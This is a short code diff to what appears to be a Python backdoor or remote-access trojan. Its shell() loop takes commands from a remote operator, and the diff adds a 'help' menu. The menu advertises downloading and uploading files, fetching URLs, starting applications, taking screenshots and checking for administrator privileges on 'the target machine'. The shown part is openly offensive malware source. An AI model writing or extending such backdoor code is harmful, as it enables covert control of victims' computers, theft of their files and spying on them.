@@ -59,6 +59,16 @@ def shell():
         command = reliable_recv()
         if command == 'q':
             break
+        elif command == 'help':
+            help_option = ''' 
+                            download <file> - Download a file from the target machine
+                            upload <file> - Upload a file to the target machine
+                            get <url> - Download a file from the specified url
+                            start <app> - Start tunning specific application on the target machine
+                            screenshot - Take a screenshot on the target machine
+                            check - Chem for aministrator privileges
+                          '''
+            reliable_send(help_option)
         elif command[:2] == 'cd' and len(command) > 1:
             try:
                 os.chdir(command[3:])
